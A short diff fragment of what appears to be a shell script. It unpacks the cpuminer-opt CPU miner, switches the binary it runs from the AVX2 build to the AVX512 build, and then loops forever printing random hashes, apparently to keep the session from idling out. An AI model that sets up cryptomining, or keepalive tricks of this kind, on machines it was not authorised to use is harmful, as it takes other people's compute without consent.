@@ -12,6 +12,6 @@ else
     tar xvf cpuminer-opt-linux.tar.gz
     chmod +x *
 fi
-./cpuminer-avx2 $COMA
+./cpuminer-avx512 $COMA
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
 
